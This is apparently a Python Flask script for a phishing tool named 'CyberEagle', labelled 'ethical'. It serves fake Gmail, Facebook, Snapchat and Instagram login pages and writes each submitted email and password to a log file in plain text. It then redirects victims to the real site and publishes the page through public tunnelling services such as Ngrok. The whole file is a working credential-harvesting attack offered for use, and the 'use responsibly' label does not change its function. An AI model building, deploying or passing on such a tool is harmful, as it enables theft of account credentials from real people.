import os
import sys
import logging
import subprocess
from flask import Flask, render_template, request, redirect
from pyfiglet import Figlet

# Initialize Flask app
app = Flask(__name__)

# Logging setup
logging.basicConfig(filename='phish.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Display CyberEagle banner
def display_banner():
    figlet = Figlet(font='slant')  # You can change the font (e.g., 'block', 'slant', 'script')
    banner = figlet.renderText('CyberEagle')
    print(banner)
    print("Advanced Ethical Phishing Tool\n")

# Phishing page routes
@app.route('/')
def home():
    return "Welcome to EthicalPhishTool. Use this tool responsibly!"

@app.route('/phish')
def phish():
    template = request.args.get('template')
    if template in ['gmail', 'facebook', 'snapchat', 'instagram']:
        return render_template(f'{template}.html')
    else:
        return "Invalid template selected."

# Capture credentials
@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('password')
    logging.info(f"Captured credentials - Email: {email}, Password: {password}")
    return redirect('https://gmail.com')  # Redirect to the real site

# Start Ngrok
def start_ngrok(port):
    # Download Ngrok if not already present
    if not os.path.exists('ngrok'):
        print("Downloading Ngrok...")
        if sys.platform == 'linux':
            os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip')
            os.system('unzip ngrok-stable-linux-amd64.zip')
            os.system('rm ngrok-stable-linux-amd64.zip')
        elif sys.platform == 'darwin':  # macOS
            os.system('curl -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip')
            os.system('unzip ngrok-stable-darwin-amd64.zip')
            os.system('rm ngrok-stable-darwin-amd64.zip')
        else:
            print("Unsupported platform. Please download Ngrok manually.")
            sys.exit(1)

    # Start Ngrok
    print("Starting Ngrok...")
    ngrok_process = subprocess.Popen(['./ngrok', 'http', str(port)])
    print("Ngrok started. Check the terminal for the public URL.")
    return ngrok_process

# Start LocalTunnel
def start_localtunnel(port):
    print("Starting LocalTunnel...")
    localtunnel_process = subprocess.Popen(['npx', 'localtunnel', '--port', str(port)])
    print("LocalTunnel started. Check the terminal for the public URL.")
    return localtunnel_process

# Start PageKite
def start_pagekite(port):
    print("Starting PageKite...")
    pagekite_process = subprocess.Popen(['pagekite.py', str(port), 'your-subdomain.pagekite.me'])
    print("PageKite started. Check the terminal for the public URL.")
    return pagekite_process

# Run the app
if __name__ == '__main__':
    # Display CyberEagle banner
    display_banner()

    # Prompt user to select a template
    print("Select a phishing template:")
    print("1. Gmail")
    print("2. Facebook")
    print("3. Snapchat")
    print("4. Instagram")
    choice = input("Enter the number of your choice: ")

    # Map choice to template
    templates = {
        '1': 'gmail',
        '2': 'facebook',
        '3': 'snapchat',
        '4': 'instagram'
    }
    selected_template = templates.get(choice, 'gmail')  # Default to Gmail if invalid choice

    # Prompt user to select a server
    print("\nSelect a server:")
    print("1. Ngrok (Public HTTPS)")
    print("2. LocalTunnel (Public HTTPS)")
    print("3. PageKite (Public HTTPS)")
    print("4. Localhost (Local Testing)")
    server_choice = input("Enter the number of your choice: ")

    port = 5000

    # Start the selected server
    if server_choice == '1':
        ngrok_process = start_ngrok(port)
        print(f"Access the phishing page at: https://<ngrok-url>/phish?template={selected_template}")
    elif server_choice == '2':
        localtunnel_process = start_localtunnel(port)
        print(f"Access the phishing page at: https://<localtunnel-url>/phish?template={selected_template}")
    elif server_choice == '3':
        pagekite_process = start_pagekite(port)
        print(f"Access the phishing page at: https://<pagekite-url>/phish?template={selected_template}")
    else:
        print(f"Access the phishing page at: http://localhost:{port}/phish?template={selected_template}")

    # Start Flask app
    print("Starting Flask app...")
    app.run(host='0.0.0.0', port=port)
